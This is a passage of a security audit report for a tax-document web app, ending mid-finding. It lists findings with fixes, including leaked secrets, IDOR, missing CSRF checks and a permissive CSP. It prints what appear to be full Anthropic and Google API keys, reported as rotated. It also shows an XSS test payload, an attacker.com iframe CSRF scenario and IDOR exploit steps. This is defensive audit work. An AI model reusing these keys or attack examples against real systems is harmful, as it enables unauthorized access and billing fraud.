# TaxFormatter Security Audit

**Date:** 2026-04-09
**Scope:** Full codebase at `/Users/sean/Desktop/trw` (Next.js 15 frontend + Python AWS Lambda backend + Postgres/Neon)
**Methodology:** Six parallel Claude subagent scans, each specialized in one vulnerability class, followed by manual verification of high-impact findings.
**Authorization:** Owner-initiated defensive security review.

---

## Executive Summary

| Severity     | Count | Resolved |
| ------------ | ----- | -------- |
| **Critical** | 4     | 4 ✅     |
| **High**     | 15    | see [SECURITY_REMEDIATION_PLAN.md](SECURITY_REMEDIATION_PLAN.md) |
| **Medium**   | 21    | see [SECURITY_REMEDIATION_PLAN.md](SECURITY_REMEDIATION_PLAN.md) |
| **Low**      | 11    | see [SECURITY_REMEDIATION_PLAN.md](SECURITY_REMEDIATION_PLAN.md) |
| **Total**    | **51** |          |

### Overall posture

The codebase shows **solid security fundamentals**: parameterized SQL everywhere, `yaml.safe_load`, no `pickle`/`eval`/`subprocess(shell=True)` with user input, Stripe webhook signature verification, file magic-byte checks, API keys hashed at rest, HSTS, `poweredByHeader: false`. The team has written security helpers (`validateCsrfToken`, `generateCsrfToken`, `rateLimiters`, `getClientIdentifier`) — the problem is that **several of those helpers are never actually called** at their intended use sites.

The most urgent problems fall into three buckets:

1. **Live production secrets committed to the repo** (`.env.local`, `terraform.tfvars.example`, `.env.sentry-build-plugin`). These must be rotated before anything else — no amount of code fixing matters if the keys are public.
2. **Missing authorization checks** on payment and bank-statement endpoints. These are exploitable by any authenticated (or in one case, unauthenticated) user and result in direct financial loss or PII exposure.
3. **Defense-in-depth gaps** (CSRF never validated, `'unsafe-eval'` CSP, timing-unsafe code comparisons) that individually aren't breaches but collectively make any XSS or auth edge case much worse.

### Top 10 things to fix this week

1. **Rotate every secret in `.env.local`, `terraform.tfvars.example`, and `.env.sentry-build-plugin`.** See §C-1 through §C-4.
2. **Scrub secrets from git history** (`git filter-repo` — `git rm` alone is insufficient since the blobs remain reachable).
3. **Add ownership check to `/api/developer/subscribe`** — currently any user can upgrade any API key and bill the victim. See §H-1.
4. **Require auth on `/api/bank/job/[jobId]/download`** — currently anyone with a jobId can download another user's bank statement. See §H-2.
5. **Call `validateCsrfToken` on state-changing routes.** The helper exists; it's dead code. See §H-4.
6. **Remove `'unsafe-eval'` from CSP** and nonce the inline scripts. See §H-8.
7. **Fix timing-unsafe code comparisons** in verification/2FA (use `crypto.timingSafeEqual`). See §H-5.
8. **Add rate limiting** to `/api/auth/verify` and `/api/auth/2fa/login-verify`. See §H-6.
9. **Persist webhook idempotency state to Postgres** (current `Set<string>` evaporates on restart). See §M-1.
10. **Set `sendDefaultPii: false`** in all three Sentry configs; drop session replays to 0 in production. See §H-10.

---

## Methodology

Six parallel `Explore` subagents were dispatched, each scoped to one vulnerability class and given the full project layout, a targeted grep checklist, and output format requirements (severity / location / evidence / impact / fix). Each agent was instructed to read suspicious files fully, cite file:line, and avoid fabricating issues. Findings from all six were cross-referenced and deduplicated; a small number were manually verified against the live source tree to separate real bugs from false positives.

The six scans:

1. **Auth & session** — `app/api/auth/**`, `app/login|signup|reset-password|forgot-password|verify/**`, `lib/auth-db.ts`, `lib/validation.ts`
2. **SQL/ORM injection** — `backend/services/**`, `backend/handlers/**`, `db/**`, `lib/*-db.ts`
3. **XSS/CSRF/SSRF** — `app/**`, `components/**`, `next.config.ts`, middleware
4. **Secret leakage** — `.env*`, `public/**`, `backend/terraform/**`, all source
5. **Payments/IDOR** — Stripe + webhook routes, user-scoped resources
6. **Python injection/traversal** — `backend/handlers/**`, `backend/services/**`, dependency pinning

---

## Severity definitions

| Severity     | Meaning |
| ------------ | ------- |
| **Critical** | Actively exploitable now with direct, large-blast-radius impact (secret compromise, RCE, full DB access). Fix within 24 hours. |
| **High**     | Exploitable by a remote attacker with modest prerequisites (authenticated user, guessed ID, crafted payload) and produces financial loss, PII exposure, or account takeover. Fix within a week. |
| **Medium**   | Requires chained conditions, reduces defense-in-depth, or affects a smaller surface. Fix within a sprint. |
| **Low**      | Hardening / best practice. Fix opportunistically. |

---

# Critical Findings

> **✅ All Critical findings resolved 2026-04-30 (Workstream 2).** Every secret listed in C-1 through C-4 has been rotated at its provider, Vercel env vars updated, single redeploy went green, and git history was scrubbed with `git filter-repo` (501 commits rewritten, force-pushed; backup branch `backup/pre-history-scrub` pushed to origin). AWS access keys and Stripe secret + webhook keys were also rotated as bonus items flagged in Vercel. **Pending:** provider access-log audit and 401 verification against rotated keys — tracked in Workstream 2 report.

## C-1 — Live production secrets committed to `.env.local`

- **Severity:** Critical
- **Status:** ✅ Resolved 2026-04-30 — all listed secrets rotated; `.env.local` removed from git tracking; history scrubbed.
- **Category:** Secret leakage
- **Location:** `/Users/sean/Desktop/trw/.env.local`

### Evidence

The file `.env.local` is tracked by git and contains live production credentials. Secret values redacted here (`***REDACTED***`):

| Line | Variable | Notes |
| ---- | -------- | ----- |
| 12 | `NEXTAUTH_SECRET=***REDACTED***` | JWT signing secret — forging this compromises every session |
| 15 | `GOOGLE_CLIENT_SECRET=***REDACTED***` | OAuth client secret |
| 19 | `NEON_DATABASE_URL=postgresql://neondb_owner:***REDACTED***@...` | Production DB read/write |
| 25 | `SMTP_PASSWORD=re_***REDACTED***` | Resend API key (send mail as you) |
| 29 | `MAILCHIMP_API_KEY=***REDACTED***-us8` | Mailing list access |
| 34 | `GOOGLE_GEMINI_API_KEY=***REDACTED***` | Pay-per-token LLM access |
| 57 | `NEXT_PUBLIC_SENTRY_DSN=https://***REDACTED***@...` | Telemetry tunnel (acceptable as public) |
| 65 | `TESTSPRITE_API_KEY=sk-user-***REDACTED***` | |
| 75 | `TAXFORMATTER_API_KEY=tf_live_***REDACTED***` | **Live** API key for production tier |
| 76 | `NPM_TOKEN=npm_***REDACTED***` | **Publish rights to npm registry** |

### Impact

Any person with read access to the repository (or anyone who has ever cloned it) now holds:

- **Database takeover** — full read/write of production user data, tax documents, and API keys via the Neon URL.
- **Session forgery** — with `NEXTAUTH_SECRET`, an attacker can mint a valid JWT for any user, bypassing login entirely.
- **Email impersonation** — send mail as `@taxformatter.com` via Resend.
- **Supply-chain compromise** — publish malicious versions of any package you own on npm.
- **Billing attack** — rack up unlimited Gemini charges on your Google Cloud account.
- **Customer data exfiltration** — access your Mailchimp mailing list.

### Fix

1. **Immediately revoke every secret listed above** at each provider:
   - Neon: rotate DB password, update connection string in AWS Secrets Manager / Vercel
   - NextAuth: generate new `NEXTAUTH_SECRET` (`openssl rand -base64 32`); this will log out all users (accept this cost)
   - Google Cloud: delete OAuth client secret, delete Gemini API key
   - Resend: revoke + reissue
   - Mailchimp: revoke + reissue
   - npm: revoke the token at npmjs.com → Access Tokens
   - TaxFormatter: rotate your own production API key
2. **Scrub git history** — not `git rm` alone; the blobs remain reachable via reflog and old commits:
   ```bash
   pip install git-filter-repo
   git filter-repo --path .env.local --invert-paths
   git push --force-with-lease origin main   # if repo is private; if public, already too late
   ```
3. **Add pre-commit protection** — either `git-secrets`, `detect-secrets`, or a simple pre-commit hook that rejects commits touching `.env*`. Add to `.husky/pre-commit` or `.pre-commit-config.yaml`.
4. **Verify `.gitignore`** — confirm `.env*.local` is present (likely already is, but the file was committed before the rule was added, hence it's tracked).
5. **Audit access logs** at each provider for unauthorized use dating back to when the file was first committed. Check Neon query logs, Resend send logs, npm publish history.

---

## C-2 — Live Anthropic API key in `terraform.tfvars.example`

- **Severity:** Critical
- **Status:** ✅ Resolved 2026-04-30 — old key deleted at console.anthropic.com; new `taxformatter-production` key added to Vercel.
- **Category:** Secret leakage
- **Location:** `/Users/sean/Desktop/trw/backend/terraform/terraform.tfvars.example:13`

### Evidence

```
anthropic_api_key = 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
```

A `.tfvars.example` file is intended as a template and ships a placeholder, but this one ships the **real** key.

### Impact

Pay-as-you-go Anthropic Claude API access on your account. An attacker can run arbitrary inference and bill your organization without limit until the key is revoked.

### Fix

1. Revoke the key at console.anthropic.com → API Keys immediately.
2. Replace the value in `terraform.tfvars.example` with a placeholder: `anthropic_api_key = "sk-ant-..."`
3. Issue a new key and store it as a Terraform Cloud variable (marked sensitive) or in AWS Secrets Manager, never in `.tfvars`.
4. Verify `terraform.tfvars` (the real file, no `.example`) is in `.gitignore`.

---

## C-3 — Live Google Gemini API key in `terraform.tfvars.example`

- **Severity:** Critical
- **Status:** ✅ Resolved 2026-04-30 — key deleted at aistudio.google.com; not replaced (not needed in production).
- **Category:** Secret leakage
- **Location:** `/Users/sean/Desktop/trw/backend/terraform/terraform.tfvars.example:15` (same key also appears at `.env.local:34`)

### Evidence

```
GOOGLE_GEMINI_API_KEY=AIzaSyDPyaBK8KCguF1p_GhruvkIVZ5CoOBQqMk
```

### Impact

Full Gemini API access on your Google Cloud project. Attackers commonly exploit leaked Google API keys for crypto-related abuse (Gemini inference, Maps quota drain, Translate quota drain). Billing damage can be significant before Google's anomaly detection triggers.

### Fix

1. Delete the key at console.cloud.google.com → APIs & Services → Credentials.
2. Replace with placeholder in `.tfvars.example`.
3. Regenerate and store in Secrets Manager / Terraform Cloud.
4. Add key restrictions at creation time: HTTP referrer allowlist or API restriction to only Gemini.

---

## C-4 — Sentry auth token committed

- **Severity:** Critical
- **Status:** ✅ Resolved 2026-04-30 — both old tokens revoked; new token created and added to Vercel as `SENTRY_AUTH_TOKEN` (was missing); `.env.sentry-build-plugin` removed from git tracking.
- **Category:** Secret leakage
- **Location:** `/Users/sean/Desktop/trw/.env.sentry-build-plugin`

### Evidence

```
SENTRY_AUTH_TOKEN=sntrys_eyJpYXQi...***REDACTED***
```

The file exists at the repo root and contains a long-lived Sentry auth token.

### Impact

Attackers can upload malicious source maps (useful for disguising injected code), modify alerting rules, delete error events, and pull sensitive telemetry — which is especially dangerous because Sentry is currently configured with `sendDefaultPii: true` (see §H-10), so the telemetry contains user emails and session replays.

### Fix

1. Rotate token at sentry.io → Settings → Auth Tokens.
2. `git rm --cached .env.sentry-build-plugin` and add to `.gitignore` if not already.
3. Inject via CI environment variable going forward (GitHub Actions secret, Vercel env var, etc.).
4. Scrub from git history along with C-1.

---

# High Findings

## H-1 — IDOR on subscription tier upgrade (attacker bills victim)

- **Severity:** High
- **Category:** Authorization / IDOR / financial
- **Location:** `app/api/developer/subscribe/route.ts:11-66`

### Evidence

```ts
const body = await request.json();
const tier = body.tier?.toUpperCase() as StripeApiPlan | undefined;
const apiKeyId = body.apiKeyId as string | undefined;

// NO OWNERSHIP CHECK — accepts any apiKeyId from user
const checkoutSession = await stripe.checkout.sessions.create({
  metadata: {
    api_tier: tier.toLowerCase(),
    api_key_id: apiKeyId,   // trusted blindly
    userId: session.user.id,
  },
});
```

And at webhook handling (`app/api/webhooks/stripe/route.ts:62-95`), the `api_key_id` from metadata is used directly to `UPDATE api_keys SET tier = $1 WHERE id = $5` with no cross-check that the updated row's `user_id` matches the paying user.

### Impact

1. Attacker signs up, obtains any authenticated session.
2. Attacker enumerates or guesses a victim's `apiKeyId` (UUIDs are not secret — they appear in URLs, logs, screenshots, client-side state).
3. Attacker POSTs `/api/developer/subscribe` with `{ tier: "BUSINESS", apiKeyId: <victim-key-id> }`.
4. Stripe checkout succeeds using **attacker's** card.
5. Webhook fires → **victim's** API key is upgraded to Business tier.

Alternatively, attacker supplies their own card but upgrades a victim's key, then cancels the card — webhook already fired, DB is updated, victim keeps the upgrade until subscription cancellation webhook arrives. More impactful inversion: once ownership is confused, any downstream billing dispute, cancellation, or refund lands on the wrong account.

### Fix

Before creating the checkout session, verify the API key belongs to the authenticated user:

```ts
const apiKey = await queryOne<{ user_id: string }>(
  'SELECT user_id FROM api_keys WHERE id = $1',
  [apiKeyId]
);
if (!apiKey || apiKey.user_id !== session.user.id) {
  return NextResponse.json({ error: 'Not authorized' }, { status: 403 });
}
```

Additionally, in the webhook handler, re-verify that the `api_key_id` in metadata resolves to the `userId` in metadata before applying the tier change — defense in depth.

---

## H-2 — Anonymous download of any bank statement by jobId guess

- **Severity:** High
- **Category:** Authorization / IDOR / PII disclosure
- **Location:** `app/api/bank/job/[jobId]/download/route.ts:10-44`

### Evidence

```ts
/**
 * GET /api/bank/job/[jobId]/download
 * Anonymous access allowed — download is gated by knowing the jobId (UUID)
 */
export async function GET(
  request: NextRequest,
  { params }: { params: Promise<{ jobId: string }> }
) {
  // NO AUTHENTICATION CHECK
  const { jobId } = await params;
  const lambdaResponse = await fetch(
    `${API_GATEWAY_URL}/bank/job/${jobId}/download?format=${format}`,
  );
```

The JSDoc comment is explicit: access is intentionally anonymous, relying on UUID unguessability as the only control.

### Impact

UUIDs are **not a secret**. They appear in:
- The user's own browser history and tab URL
- HTTP referrer headers to any outbound link clicked from the job page
- Server access logs (Vercel, CloudFront, any proxy)
- Screenshots or support tickets pasted into Slack/email
- JavaScript errors reported to Sentry (combined with `sendDefaultPii: true`, Sentry now holds jobIds linked to user emails)
- Any shared link, even accidentally

Anyone who obtains a jobId can download the processed bank statement, which contains: account holder name, account number suffix, every transaction with amount/date/description/balance, routing metadata. This is a regulated data class (GLBA in the US, similar regimes elsewhere).

### Fix

Require authentication and verify ownership:

```ts
const session = await getServerSession(authOptions);
if (!session?.user?.id) {
  return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
}

const job = await queryOne<{ user_id: string }>(
  'SELECT user_id FROM bank_jobs WHERE id = $1',
  [jobId]
);
if (!job || job.user_id !== session.user.id) {
  return NextResponse.json({ error: 'Forbidden' }, { status: 403 });
}
```

If anonymous share links are a legitimate product feature, replace the UUID-as-capability pattern with an explicit signed URL: generate a cryptographically random 32-byte token stored in a `shared_links` table with an expiry and revoke capability.

---

## H-3 — Bank job status endpoint missing ownership check

- **Severity:** High
- **Category:** Authorization / IDOR
- **Location:** `app/api/bank/job/[jobId]/route.ts:10-45`

### Evidence

```ts
const session = await getServerSession(authOptions);
if (!session?.user?.id) {
  return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
}

// Auth check present, but ownership never verified
const lambdaResponse = await fetch(`${API_GATEWAY_URL}/bank/job/${jobId}`, { ... });
return NextResponse.json(data);
```

### Impact

Any authenticated user can query the status (and potentially the parsed transaction metadata returned by the Lambda) of any bank job by guessing jobIds. Less severe than H-2 because auth is at least required, but still a multi-tenant data-leak and a stepping stone to H-2 (find a jobId here, then download it).

### Fix

Same pattern as H-2 — query `bank_jobs WHERE id = $1` and compare `user_id` to `session.user.id` before proxying the request to Lambda.

---

## H-4 — CSRF tokens generated but never validated

- **Severity:** High
- **Category:** CSRF
- **Location:** `lib/validation.ts:188-199` (helper); used nowhere in `app/api/**`

### Evidence

The helper exists and is correctly implemented with constant-time comparison:

```ts
// lib/validation.ts
export function generateCsrfToken(): string { /* ... */ }
export function validateCsrfToken(token: string, sessionToken: string): boolean {
  // constant-time comparison, correct
}
```

A grep for `validateCsrfToken` across `app/api/**` returns zero callers. State-changing routes proceed on session cookie alone:

```ts
// app/api/uploads/[uploadId]/route.ts — DELETE handler
const session = await getServerSession(authOptions);
if (!session?.user?.id) return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
// immediately deletes — no CSRF check
```

Affected routes (non-exhaustive):
- `DELETE /api/uploads/[uploadId]`
- `POST /api/jobs/[jobId]/retry`
- `POST /api/bank/process`
- `POST /api/developer/keys` (create)
- `DELETE /api/developer/keys/[keyId]`
- `POST /api/auth/2fa/enable`, `disable`
- `POST /api/customer-portal`

### Impact

A malicious page loaded by a logged-in TaxFormatter user can issue `fetch('/api/uploads/XYZ', { method: 'DELETE', credentials: 'include' })` and succeed because the session cookie is sent automatically. Next.js defaults set `SameSite=Lax` on the NextAuth cookie, which stops *most* top-level navigations but **does not stop same-origin-embedded iframes, subdomain-hosted attacker pages, or cross-origin `fetch` with `credentials: 'include'`** in older browsers. Relying on SameSite alone is insufficient.

Concrete exploit scenario: user clicks a phishing link embedding a hidden `<iframe src="attacker.com/csrf.html">` that issues destructive DELETE calls. User's upload history is wiped.

### Fix

Add a middleware or per-route wrapper that calls `validateCsrfToken()` on all mutating methods. Three options in order of effort:

1. **Double-submit cookie pattern** — on session creation, set a `__Host-csrf` cookie with a random token; require a `X-CSRF-Token` header matching it on POST/PUT/PATCH/DELETE. The existing `validateCsrfToken` helper fits this.
2. **Origin/Referer check** — middleware rejects state-changing requests whose `Origin` header isn't an allowlisted value. Simplest, fewest client changes. Breaks if you legitimately embed the app in iframes.
3. **NextAuth built-in** — if using App Router's server actions, Next.js provides an origin check for server actions. Migrate mutation endpoints to server actions where possible.

---

## H-5 — Timing-unsafe comparisons on verification and 2FA codes

- **Severity:** High
- **Category:** Authentication
- **Locations:**
  - `lib/auth-db.ts:301` — email verification code
  - `app/api/auth/2fa/login-verify/route.ts:66` — 2FA email code
  - `lib/auth-db.ts:399` — reset token DB lookup (see note)

### Evidence

```ts
// lib/auth-db.ts:301
if (user.verification_code !== code) {
  return { success: false, error: 'Invalid verification code' };
}

// app/api/auth/2fa/login-verify/route.ts:66
if (user2fa.two_factor_login_code === code && now < expiresAt) {
  valid = true;
}
```

Both use JavaScript `!==` / `===`, which short-circuit on the first differing byte. Combined with a network-observable timing signal, this leaks the matching prefix byte-by-byte.

### Impact

Pure timing attacks over the internet are noisy but feasible for low-entropy codes. A 6-digit numeric code has only 10^6 possibilities — already small. If an attacker can use timing to determine the matching prefix, the search space collapses to ~10 per position × 6 positions = 60 attempts instead of 10^6. Especially dangerous for 2FA where only a brief window is available.

**The same file, `lib/validation.ts`, already contains a constant-time comparator** — it's used for CSRF tokens but not for auth codes. The fix is literally to call the existing helper.

Note on `reset_token`: that comparison happens in the SQL layer (`WHERE reset_token = $1`), not in application code. Postgres index lookups have their own timing characteristics but are much less attacker-visible than application-level branches. Mitigating the reset-token case is lower priority than the two above; the simple mitigation is to store a SHA-256 hash of the token rather than the token itself, so the DB compare is over a fixed-length hash.

### Fix

```ts
import { timingSafeEqual } from 'node:crypto';

function constantTimeStringEqual(a: string, b: string): boolean {
  const aBuf = Buffer.from(a, 'utf8');
  const bBuf = Buffer.from(b, 'utf8');
  if (aBuf.length !== bBuf.length) return false;
  return timingSafeEqual(aBuf, bBuf);
}

// lib/auth-db.ts:301
if (!user.verification_code || !constantTimeStringEqual(user.verification_code, code)) {
  return { success: false, error: 'Invalid verification code' };
}
```

For reset tokens: store `sha256(token)` in the DB and compare hashes, so DB lookup is over constant-length values and token leakage via DB backup is prevented.

---

## H-6 — No rate limiting on email verification endpoint

- **Severity:** High
- **Category:** Brute force / rate limiting
- **Location:** `app/api/auth/verify/route.ts`

### Evidence

The `rateLimiters.auth.check(identifier)` helper is imported and used by `/api/auth/[...nextauth]/route.ts`, `/api/auth/signup`, `/api/auth/forgot-password` — but the `/api/auth/verify` route never calls it.

### Impact

6-digit verification codes have 10^6 possibilities. Without rate limiting, an attacker who knows a victim's email (or tries many emails) can brute force the code in minutes over a reasonable connection. Combined with H-5 (timing), this drops from minutes to seconds.

### Fix

Add the same rate-limit pattern used in other auth routes:

```ts
const identifier = getClientIdentifier(request);
const rateLimit = await rateLimiters.auth.check(identifier);
if (!rateLimit.success) {
  return NextResponse.json(
    { error: 'Too many attempts. Try again later.' },
    { status: 429 }
  );
}
```

Better: rate limit **per email** as well as per IP, because an attacker can rotate IPs through a proxy pool. Track failed attempts on `users.failed_verify_attempts` and lock the verification after 5.

Apply the same fix to `/api/auth/2fa/login-verify` (§M-7).

---

## H-7 — No account lockout after failed logins

- **Severity:** High
- **Category:** Brute force
- **Location:** `app/api/auth/[...nextauth]/route.ts`, `lib/auth-db.ts`

### Evidence

Only IP-based rate limiting exists (5 failed attempts per 15 minutes per IP). No per-account `failed_login_attempts` counter exists in the schema, and no lockout logic exists in the credential `authorize()` callback.

### Impact

Distributed brute force (rotating residential proxy) trivially bypasses IP-based limits. With 1000 IPs × 5 attempts per 15 min = 5000 attempts per 15 min per account — enough to test common passwords within hours.

### Fix

Add columns and logic:

```sql
ALTER TABLE users ADD COLUMN failed_login_attempts integer DEFAULT 0 NOT NULL;
ALTER TABLE users ADD COLUMN locked_until timestamptz;
```

In the credential callback:
- On failed login, `UPDATE users SET failed_login_attempts = failed_login_attempts + 1, locked_until = CASE WHEN failed_login_attempts + 1 >= 5 THEN now() + interval '30 minutes' ELSE locked_until END WHERE email = $1`.
- On successful login, reset both columns.
- Before comparing passwords, reject if `locked_until > now()`.
- Return a generic error message (do not reveal lockout state — see §M-4 on user enumeration).

Consider also implementing CAPTCHA on the login form after 3 failed attempts for a given email.

---

## H-8 — Content Security Policy permits `'unsafe-eval'` and `'unsafe-inline'`

- **Severity:** High
- **Category:** XSS / CSP
- **Location:** `next.config.ts:59`

### Evidence

```ts
"script-src 'self' 'unsafe-inline' 'unsafe-eval' https://www.googletagmanager.com ...",
"style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
```

### Impact

The purpose of CSP is to make XSS non-fatal by refusing to execute injected scripts. `'unsafe-inline'` re-enables injected `<script>` tags and inline event handlers. `'unsafe-eval'` re-enables `eval`, `new Function(...)`, and `setTimeout('code-as-string', ...)`. Together they reduce CSP from "XSS mitigation" to "cosmetic header."

If any DOM XSS exists (see §H-9 for a candidate), it is now a full page compromise: session cookie is still protected by HttpOnly, but the attacker can make authenticated fetches on behalf of the user.

### Fix

1. Remove `'unsafe-eval'` unconditionally. It is rarely needed by modern code. Audit for any library that requires it (some template engines, some Wasm loaders) and replace.
2. Replace `'unsafe-inline'` with nonces. Next.js middleware can generate a per-request nonce:
   ```ts
   // middleware.ts
   const nonce = Buffer.from(crypto.randomUUID()).toString('base64');
   response.headers.set(
     'Content-Security-Policy',
     `script-src 'self' 'nonce-${nonce}' https://www.googletagmanager.com ...`,
   );
   ```
   Then inject the nonce into any legitimate inline scripts via Next's `<Script nonce={nonce}>`.
3. For Google Tag Manager specifically, use its CSP-compliant mode (it supports nonce propagation).
4. For Tailwind-injected styles, they're output as `<style>` tags by the build — `style-src 'self'` is usually sufficient once Tailwind purge runs, but if you need inline styles you can add `'unsafe-hashes'` with specific hashes, or allow a nonce there too.

---

## H-9 — User-controlled error text rendered without sanitization

- **Severity:** High
- **Category:** Stored XSS (potential)
- **Location:** `app/dashboard/jobs/[jobId]/JobDetailClient.tsx:230`

### Evidence

```tsx
{job.status === 'failed' && job.error && (
  <p className="text-red-300/70 text-sm mt-1">{job.error}</p>
)}
```

`job.error` flows from the backend processor which populates it from exception messages during CSV/PDF parsing. Exception messages can contain attacker-controlled strings — e.g., a malicious CSV with a header cell `<img src=x onerror=alert(1)>` that causes an exception including the cell contents.

### Impact

React does escape text in `{expression}` form by default, so a simple `<img onerror>` in `job.error` would render as literal text, not as a script. **This is not immediately exploitable in React**. However:

- If a future refactor uses `dangerouslySetInnerHTML` for rich error formatting, it becomes XSS.
- If any upstream code path sets `job.error` to an object with a custom `toString` or uses `{...props}` spread, escaping can be bypassed.
- Combined with `'unsafe-eval'` + `'unsafe-inline'` CSP (H-8), a stored XSS here escalates to full takeover.

I'm marking this **High** not because React currently renders it unsafely, but because it's a latent XSS carrier: error strings from untrusted parsing should be sanitized at the source so the frontend never has to worry about them.

### Fix

Sanitize error messages at the **write** point, not the render point:

```python
# backend/handlers/processor.py
import re
SAFE_ERROR_RE = re.compile(r'[^\w\s:.,\-()/]')
def safe_error_message(msg: str) -> str:
    return SAFE_ERROR_RE.sub('', msg)[:500]
```

Use `safe_error_message(str(e))` before persisting to `jobs.error`.

Also: §M-9 (verbose error leaks) applies here — return a generic message to the client and log the full traceback server-side, same pattern.

---

## H-10 — Sentry configured with `sendDefaultPii: true` and session replays

- **Severity:** High
- **Category:** Privacy / data exposure
- **Locations:**
  - `instrumentation-client.ts:31`
  - `sentry.server.config.ts:18`
  - `sentry.edge.config.ts:19`

### Evidence

```ts
sendDefaultPii: true,
enableLogs: true,
replaysSessionSampleRate: 0.1,
```

### Impact

`sendDefaultPii: true` ships user IP addresses, cookies, `Authorization` headers, request bodies, and email addresses to Sentry on every error event. `replaysSessionSampleRate: 0.1` means 10% of sessions are full-fidelity video replays including every keystroke and every DOM state — including password and 2FA fields unless explicitly masked (Sentry's default masking covers some but not all input types).

Combined with §C-4 (leaked Sentry token), this means: a third party with the leaked token could pull user PII, emails, IPs, and session recordings out of Sentry.

Even without the token leak, this is a significant compliance surface: GDPR Art. 32 and most US state privacy laws require that you limit PII processing to what's necessary. Ten percent of all sessions being video-recorded exceeds "necessary for error debugging."

### Fix

```ts
// all three config files
Sentry.init({
  dsn: ...,
  sendDefaultPii: false,                    // was: true
  replaysSessionSampleRate: 0,              // was: 0.1 — keep errorSampleRate high instead
  replaysOnErrorSampleRate: 0.1,            // only replay errored sessions
  beforeSend(event) {
    // additional scrubbing
    if (event.request?.headers) {
      delete event.request.headers['authorization'];
      delete event.request.headers['cookie'];
    }
    if (event.user) {
      delete event.user.email;
      delete event.user.ip_address;
    }
    return event;
  },
});
```

Additionally, configure Sentry's data scrubbing settings at the project level to catch common patterns (credit card numbers, SSNs).

---

## H-11 — CORS wildcard `*` on Lambda API with credentialed headers

- **Severity:** High
- **Category:** CORS misconfiguration
- **Location:** `backend/handlers/api.py:31`, `backend/handlers/webhook.py:64`

### Evidence

```python
default_headers = {
    "Content-Type": "application/json",
    "Access-Control-Allow-Origin": "*",
    "Access-Control-Allow-Headers": "Content-Type,X-API-Key,Authorization",
    "Access-Control-Allow-Methods": "GET,POST,DELETE,OPTIONS",
}
```

### Impact

`Access-Control-Allow-Origin: *` combined with `Access-Control-Allow-Headers: Authorization` is a classic misconfiguration: browsers will refuse to send credentials (`Authorization` header) with a wildcard origin, so *browser-based* CSRF is technically blocked. However:

- Any non-browser client (curl, Python, etc.) ignores CORS entirely — CORS is a browser protection, not a server one. The wildcard is meaningless for server-to-server attacks.
- If you ever later add `Access-Control-Allow-Credentials: true`, you immediately have a full credentialed CSRF vulnerability on every API call.
- The wildcard advertises "this API accepts cross-origin requests from anywhere" which is false — only authenticated clients work. This invites integration attempts that shouldn't be encouraged.

### Fix

Allowlist specific origins:

```python
ALLOWED_ORIGINS = {
    "https://taxformatter.com",
    "https://www.taxformatter.com",
    "https://app.taxformatter.com",
}

def cors_headers(event):
    origin = event.get("headers", {}).get("origin", "")
    allowed = origin if origin in ALLOWED_ORIGINS else "https://taxformatter.com"
    return {
        "Access-Control-Allow-Origin": allowed,
        "Access-Control-Allow-Headers": "Content-Type,X-API-Key",
        "Access-Control-Allow-Methods": "GET,POST,DELETE,OPTIONS",
        "Vary": "Origin",   # prevent cache poisoning
    }
```

Note: remove `Authorization` from allowed headers if the API uses `X-API-Key` instead. Sending both is unusual and typically one is vestigial.

---

## H-12 — Missing password-reset columns in schema (runtime failure)

- **Severity:** High (correctness bug that surfaces as DoS on password reset)
- **Category:** Schema drift
- **Locations:**
  - Referenced in code: `lib/auth-db.ts:377-439`
  - Migration scripts searched: none found. `reset_token` / `reset_token_expires` exist in neither `db/schema.sql`, `db/migrations/**`, nor `scripts/*.sql`.
  - Verification command: `grep -r "reset_token" db scripts backend` → no matches

### Evidence

`lib/auth-db.ts` references `reset_token` and `reset_token_expires`:

```ts
await execute(
  `UPDATE users SET reset_token = $1, reset_token_expires = $2 WHERE id = $3`,
  [token, expires, userId]
);
```

The `db/migrations/` directory contains migrations 002–008, none adding these columns. No migration file anywhere in the repo adds them.

The verification/2FA columns (`email_verified`, `verification_code`, `verification_code_expires`, `two_factor_secret`, `two_factor_enabled`, `backup_codes`) exist only in standalone scripts at `scripts/add-verification-columns.sql` and `scripts/add-2fa-columns.sql` — they're outside the sequenced migration directory, so a fresh bootstrap using only `db/migrations/` would miss them too.

### Impact

This is not a vulnerability in the usual sense — it's a correctness bug with security implications:

1. If the columns have been manually added to the live DB (by running the `scripts/*.sql` files ad-hoc against Neon), the code works but reproducibility is broken: a new environment cannot bootstrap from the repo alone.
2. If `reset_token` columns have **never** been added, any call to `forgotPassword()` throws a Postgres `column "reset_token" does not exist` error, which is caught and returned as a generic 500 — preventing users from recovering their accounts (availability issue).
3. If the Postgres error is logged with stack trace (see §M-9), it leaks schema details to an attacker probing `/api/auth/forgot-password`.

### Fix

1. **Verify against production DB**:
   ```bash
   psql "$NEON_DATABASE_URL" -c "\d users" | grep -E "reset_token|verification_code|two_factor"
   ```
2. Create `db/migrations/009_add_auth_columns.sql` consolidating all missing columns:
   ```sql
   ALTER TABLE users
     ADD COLUMN IF NOT EXISTS email_verified boolean DEFAULT false NOT NULL,
     ADD COLUMN IF NOT EXISTS verification_code varchar(6),
     ADD COLUMN IF NOT EXISTS verification_code_expires timestamptz,
     ADD COLUMN IF NOT EXISTS reset_token text,
     ADD COLUMN IF NOT EXISTS reset_token_expires timestamptz,
     ADD COLUMN IF NOT EXISTS two_factor_secret text,
     ADD COLUMN IF NOT EXISTS two_factor_enabled boolean DEFAULT false NOT NULL,
     ADD COLUMN IF NOT EXISTS two_factor_login_code varchar(6),
     ADD COLUMN IF NOT EXISTS two_factor_login_code_expires timestamptz,
     ADD COLUMN IF NOT EXISTS backup_codes text[];

   CREATE INDEX IF NOT EXISTS idx_users_reset_token
     ON users (reset_token) WHERE reset_token IS NOT NULL;
   CREATE INDEX IF NOT EXISTS idx_users_verification_code
     ON users (verification_code) WHERE verification_code IS NOT NULL;
   ```
3. Delete the orphaned `scripts/add-*.sql` files (or move them into the migrations folder).
4. Add a CI check: on every PR, diff the migration files against a clean DB bootstrap and fail if `auth-db.ts` references columns that don't exist.

---

## H-13 — Dynamic UPDATE SET clause in jobs updater (currently safe, fragile)

- **Severity:** High (defensive)
- **Category:** SQL injection (pattern risk)
- **Location:** `lib/jobs-db.ts:82-109`

### Evidence

```ts
const updates: string[] = ['status = $2'];
const params: unknown[] = [jobId, status];
let paramIndex = 3;
// ... pushes hardcoded column fragments to updates ...
await execute(
  `UPDATE jobs SET ${updates.join(', ')} WHERE id = $1`,
